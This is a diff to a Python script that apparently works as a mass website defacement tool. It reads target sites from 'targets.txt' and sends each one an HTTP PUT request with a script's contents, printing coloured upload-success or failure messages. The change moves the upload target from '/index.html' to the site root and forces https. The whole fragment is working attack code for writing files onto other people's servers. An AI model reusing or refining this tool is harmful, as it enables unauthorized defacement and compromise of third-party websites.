@@ -87,13 +87,17 @@ def white(script, target_file="targets.txt"):
         for web in target:
             try:
                 site = web.strip()
-                if site.startswith("http://") is False:
-                    site = "http://" + site
-                req = s.put(site + "/index.html", data=op)
+
+                if site.startswith("http://"):
+                    site = site.replace("http://", "https://", 1)
+                elif not site.startswith("https://"):
+                    site = "https://" + site
+
+                req = s.put(site, data=op)
                 if req.status_code < 200 or req.status_code >= 250:
-                    print(red + "[" + bold + " FAILED TO UPLOAD !\033[0m     " + red + " ] %s/%s" % (site, script))
+                    print(red + "[" + bold + " FAILED TO UPLOAD !\033[0m     " + red + " ] %s" % (site))
                 else:
-                    print(green + "[" + bold + " SUCCESSFULLY UPLOADED ✓\033[0m" + green + " ] %s/%s" % (site, script))
+                    print(green + "[" + bold + " SUCCESSFULLY UPLOADED ✓\033[0m" + green + " ] %s" % (site))
             except requests.exceptions.RequestException:
                 continue
             except KeyboardInterrupt:
